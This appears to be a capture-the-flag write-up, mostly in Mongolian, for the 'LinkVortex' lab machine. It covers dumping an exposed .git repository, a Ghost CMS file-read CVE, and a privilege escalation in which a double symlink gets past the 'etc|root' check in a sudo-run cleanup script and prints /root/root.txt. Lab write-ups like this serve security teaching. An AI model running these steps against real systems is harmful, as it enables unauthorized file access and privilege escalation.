# LinkVortex - .git / clean_symlink.sh

```bash
git-dumper http://dev.linkvortex.htb/.git ./dumped
```

[image]

```bash
cat ./ghost/core/test/regression/api/admin/authentication.test.js
```

[image]

Once accessed Ghost CMS, it's vulnerable for CVE-2023-40028 (Ghost 5.58 Arbitrary File Read).

## Privilege Escalation

1. **clean_symlink.sh файлын агуулга.**

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

2. **Дээрх код нь дараах үйлдлүүдийг хийдэг.**

```
1. Хэрэв скан хийсэн файл symlink биш бол ЯМАРЧ үйлдэл хийхгүй.
2. Скан хийсэн файл нь "etc" болон "root" гэсэн тэмдэгт агуулсан бол алдаа зааж, symlink-ийг устгана
3. Үгүй бол энэ нь symlink файлыг quarantine лавлах руу зөөнө. Хэрэв CHECK_CONTENT үнэн бол symlink файлын агуулгыг хэвлэнэ.
```

## Lets Exploit

1. **double symlink**

root.txt-ийг a файлтай холбож байна.

```bash
ln -s /root/root.txt /home/bob/.cache/a
```

[image]

Харин root.txt-тэй холбосон a файлыг b.png-тэй холбож байна.

```bash
ln -s /home/bob/.cache/a /home/bob/.cache/b.png
```

[image]

Нэг ёсондоо single symlink ашиглавал тухайн файлд холбосон линкийн агуулгад "root" болон "etc" байгаа эсэхийг шалгаж байгааг double symlink-ээр тойрч гарч байна.

`CHECK_CONTENT` нь true байх ёстой.

```bash
CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/b.png
```

[image]
